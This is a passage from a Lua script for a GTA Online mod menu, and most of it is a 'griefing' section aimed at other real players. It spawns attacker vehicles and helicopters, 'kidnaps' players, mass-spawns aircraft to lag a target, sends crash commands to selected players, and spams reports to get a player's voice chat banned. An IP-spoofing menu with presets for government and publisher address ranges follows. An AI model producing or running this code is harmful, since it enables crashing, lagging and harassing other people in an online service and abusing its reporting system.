			ENTITY.SET_ENTITY_VISIBLE(driver, false, 0)
			notification("Spawned some annoying ass cars", colors.pink)
			util.yield(150)
		end
	end)

	menu.toggle(trolly_vehicles, "Invincible", {}, "", function(on)
		bandito_godmode = on
	end, false)

	menu.action(trolly_vehicles, "Delete Banditos", {}, "", function()
		delete_entities_by_model("rcbandito")
	end)

-------------------------------------
--GO KART
-------------------------------------

	local gokart_godmode = false
	menu.divider(trolly_vehicles, 'Go-Kart')

	menu.click_slider(trolly_vehicles, 'Send Go-Kart', {'sendgokart'}, '',1, 15, 1, 1, function(quantity)
		local vehicleHash = util.joaat("veto2")
		local pedHash = util.joaat('mp_m_freemode_01')
		
		while not STREAMING.HAS_MODEL_LOADED(vehicleHash) and not STREAMING.HAS_MODEL_LOADED(pedHash) do
			STREAMING.REQUEST_MODEL(vehicleHash)
			STREAMING.REQUEST_MODEL(pedHash)
			util.yield()
		end
		for i = 1, quantity do
			local gokart, driver = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
			add_blip_for_entity(gokart, 748, 5)
			ENTITY.SET_ENTITY_INVINCIBLE(gokart, gokart_godmode)
			VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
			VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(gokart, 250)
			ENTITY.SET_ENTITY_INVINCIBLE(driver, gokart_godmode)
			PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
			PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
			util.yield(150)
		end
	end)

	menu.toggle(trolly_vehicles, 'Invincible Go-Kart', {}, '', function(toggle)
		gokart_godmode = toggle
	end)

	menu.action(trolly_vehicles, 'Delete Go-Karts', {}, '', function()
		delete_entities_by_model('veto2')
	end)

	orbliterate = menu.list(griefing, "Orbliterate", {"orbliterate"}, "")
	menu.action(orbliterate, "Orbliterate", {}, "Press once to target, twice to fire. Stop spectating to cancel :)", function(on_click)
        if pid ~= players.user() then
			if waiting then
				do_fade_in(pid)
				notification("Click again to fire!", colors.pink)
				return 
			end
			waiting = true
			if not NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() then
				do_fade_in(pid)
				return
			end
			util.toast("FIRE!")
			orbital(pid) 
			do_fade_out(pid)
		end
			
    end)
	menu.action(orbliterate, "Unfuck Orbliterate", {"unfuckorbliterate"}, "If you somehow get it stuck, try this to undo it", function(on_click)
		do_fade_out(pid)
	end)

	menu.action(griefing, "Monkey Drop", {"monkeydrop"}, "", function()
		PlayerName = PLAYER.GET_PLAYER_NAME(pid)
		
		local hash = util.joaat("a_c_chimp")
		while not STREAMING.HAS_MODEL_LOADED(hash) do
			STREAMING.REQUEST_MODEL(hash)
			util.yield()
		end
		for i = 1, 69 do
			PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
			MonkeCoords = {
				["x"] = PlayerCoords.x,
				["y"] = PlayerCoords.y,
				["z"] = PlayerCoords.z + 3
			}
			entities.create_ped(28, hash, MonkeCoords, 0)
			util.yield(50)
		end
	end)

	menu.action(griefing,"Volatol Spam Player", {}, "spams volatols on target player, huge AOE", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("Started lagging the fuck out of him", colors.pink)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", colors.pink) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)
----------------------------------------------------------------------------------------------------------------------- attacker buzzard --------------------------------------------------------

	local gunner_weapon_list = {              --these are the buzzard's gunner weapons 
	{"Combat MG", "weapon_combatmg"},
	{"RPG", "weapon_rpg"}
}

buzzard_entities = {}
function spawn_buzzard(pid, gunner_weapon, collision)
	local player_ped =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
	pos.x = pos.x + math.random(-20, 20)
	pos.y = pos.y + math.random(-20, 20)
	pos.z = pos.z + math.random(20, 40)

	PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_ped, util.joaat("PLAYER"))

	local heli_hash = util.joaat("buzzard2")
	local ped_hash = util.joaat("s_m_y_blackops_01")
	STREAMING.REQUEST_MODEL(ped_hash)
	STREAMING.REQUEST_MODEL(heli_hash)
	while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(heli_hash) do
		util.yield()
	end
	local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = heli
	
	if not collision then
		VEHICLE._DISABLE_VEHICLE_WORLD_COLLISION(heli)
	end
	
	ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard_godmode)
	ENTITY.SET_ENTITY_VISIBLE(heli, buzzard_visible, 0)	
	VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
	VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
		
	local pilot = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = pilot
	
	PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilot, util.joaat("ARMY"))
	ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard_visible, 0)
	PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
	PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)

	PED.SET_PED_MAX_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard_godmode)
	--TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilot, 500, 0)

	local gunner = {}
	for i  = 1,2 do
		gunner[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		buzzard_entities[#buzzard_entities + 1] = gunner[i]
		PED.SET_PED_INTO_VEHICLE(gunner[i], heli, i)
		WEAPON.GIVE_WEAPON_TO_PED(gunner[i], util.joaat(gunner_weapon) , 9999, false, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(gunner[i], 20 --[[ they can shoot from vehicle ]], true)
		--PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
		PED.SET_PED_MAX_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_INVINCIBLE(gunner[i], buzzard_godmode)
		ENTITY.SET_ENTITY_VISIBLE(gunner[i], buzzard_visible, 0)
		PED.SET_PED_SHOOT_RATE(gunner[i], 1000)
		PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunner[i], util.joaat("ARMY"))
		TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunner[i], 1000, 0)
	end
	
	util.create_tick_handler(function()
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
	end)

	notification("Buzzard sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.pink)
	return pilot, heli
end	

	local buzzard_options = menu.list(griefing, "Enemy Buzzard", {}, "")

	menu.divider(buzzard_options, "Enemy Buzzard")

	buzzard_visible = true
	local gunner_weapon = "weapon_combatmg"
	
	menu.action(buzzard_options, "Spawn Buzzard", {}, "", function()
		local pilot, heli = spawn_buzzard(pid, gunner_weapon, collision)

		while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
			local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local a = ENTITY.GET_ENTITY_COORDS(player_ped)
			local b = ENTITY.GET_ENTITY_COORDS(heli)
			if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
				TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
			else
				TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
			end
			util.yield()
		end
	end)

	menu.divider(buzzard_options, "Settings")

	menu.toggle(buzzard_options, "Invincible", {}, "", function(on)
		buzzard_godmode = on
	end, false)
	
	local menu_gunner_weapon_list = menu.list(buzzard_options, "Gunners Weapon")
	menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

	for i = 1, #gunner_weapon_list do
		menu.action(menu_gunner_weapon_list, gunner_weapon_list[i][1], {}, "", function()
			gunner_weapon = gunner_weapon_list[i][2]
			notification("Now gunners will shoot with "..gunner_weapon_list[i][1].."s", colors.pink)
		end)
	end

	menu.toggle(buzzard_options, "Visible", {}, "You shouldn't be that toxic to turn this off", function(on)
		buzzard_visible = on
	end, true)

	menu.toggle(buzzard_options, "Collision", {}, "When it's turned off disables world collision for Buzzard. Playes can still destroy the vehicle", function(on)
		collision = on
	end, false)

	menu.action(buzzard_options, "Delete All", {}, "Deletes all Buzzards you've spawned", function()
		for key, value in pairs(buzzard_entities) do
			entities.delete_by_handle(value)
		end
	end)

	menu.action(griefing,"Spawn Attacker Tank", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("rhino")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do

                util.yield()
            end

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
                                              CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)

            coords_ped = v3()
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            coords_ped.x = coords_ped.x + math.random(-20, 20)
            coords_ped.y = coords_ped.y + math.random(-20, 20)
            coords_ped.z = coords_ped.z

            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

            VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
            TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
            TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)

            util.yield(1)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)
        end
	end)

	menu.action(griefing,"Kidnap Player", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Deliver Player to you", {"deliver"}, "Kidnaps the target and brings them to your current location", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}


            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            --TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Ban Voice Chat", {}, "May lag your game when in progress", function(on)
		if pid ~= players.user() then
			for i = 1, 30 do
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				util.yield()
			end
		end
	end)

	menu.toggle(griefing,"Report Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

	menu.toggle(griefing,"Commend Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

	passivemode = menu.list(griefing, "Passive Mode", {}, "", function(); end)

	menu.action(passivemode,"Block", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 1})
			send_script_event(1859990871, pid, {pid, 1})
		end
	end)

	menu.action(passivemode,"Unblock", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 0})
			send_script_event(2033772643, pid, {pid, 0})
		end
	end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- gotta give adequate space for these super op lua crashes

	crashes = menu.list(main, "WeakCrash", {}, "WeakCrashv1", function(); end)
	crash = menu.list(main, "CurruptCrash", {}, "CurruptCrash", function(); end)

	local WeakCrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
	}
	
                      menu.action(crashes, "Weak LAG", {}, "Might Work On Pussy's Fam", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

    		local frienm = menu.list(menu.player_root(pid), 'Player Menu', {}, '')
    		local plamenu = menu.list(frienm, 'Friendly', {}, '')

	menu.toggle(plamenu, "Max Protect Player", {"max"}, "Turns on Auto Heal, All Weapons, Never wanted commands all at once                                (Toggle 2 times to turn off)", function(on_toggle)
	if on_toggle then
		notification("Max Protect Player On... GANG SHIT :)", colors.pink)
        		menu.trigger_commands("bail".. players.get_name(pid))
        		menu.trigger_commands("autoheal".. players.get_name(pid))
        		menu.trigger_commands("arm".. players.get_name(pid))
		end
	end)

	menu.toggle(plamenu, "Crazy Drop", {"Crazy"}, "Turns on givecollectibles, Rp drops, ceopay, commands all at once                                         (Toggle 2 times to turn off)", function(on_toggle)
	if on_toggle then
		notification("Crazy Drop :)", colors.pink)
        		menu.trigger_commands("rp".. players.get_name(pid))
        		menu.trigger_commands("snack".. players.get_name(pid))
        		menu.trigger_commands("ceopay".. players.get_name(pid) .. " on")
        		menu.trigger_commands("cash 3600".. players.get_name(pid) .. " on")
        		menu.trigger_commands("givecollectibles".. players.get_name(pid))
		end
	end)

                       menu.action(crash, "MoistCrash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Moist Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Moist Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)

	menu.action(crash, "CurruptCrash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)
	
	menu.action(crashes, "Car Ram", {}, "Don't drink and drive, folks", function()
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
		util.yield(5000)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
	end)

end



misc = menu.list(menu.my_root(), "Miscellaneous Shit", {}, "", function(); end)

spoofpresets = menu.list(misc, "IP Spoofer Repository", {}, "Stand's default GeoIP may show wrong location on some presets", function(); end)

	menu.action(spoofpresets, "Enable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip on")
	end)

	menu.action(spoofpresets, "Disable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip off")
	end)

	menu.divider(spoofpresets, "Fun IP Presets")

	menu.action(spoofpresets, "Computer Problem Solving (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "US Department of Defense", {}, "", function()
		menu.trigger_commands("spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "NASA (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Apple (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Akamai (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	t2spoofpresets = menu.list(spoofpresets, "Take-Two", {}, "", function(); end)
	
	menu.action(t2spoofpresets, "Take-Two (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (US)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (AU)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (ES)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CZ)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (IN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (SG)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
	end)

	menu.divider(spoofpresets, "VPN IP Presets")

	octospoofpresets = menu.list(spoofpresets, "OVH", {}, "", function(); end)

	menu.action(octospoofpresets, "OVH (AU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(octospoofpresets, "OVH (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
	end)

	menu.action(octospoofpresets, "OVH (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
	end)

	menu.action(octospoofpresets, "OVH (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
	end)

	menu.action(octospoofpresets, "OVH (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
	end)

	tempestpresets = menu.list(spoofpresets, "Tempest Hosting", {}, "", function(); end)

	menu.action(tempestpresets, "Tempest Hosting (US-NY)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (US-CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
	end)
	
	menu.action(tempestpresets, "Tempest Hosting (US-FL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
	end)

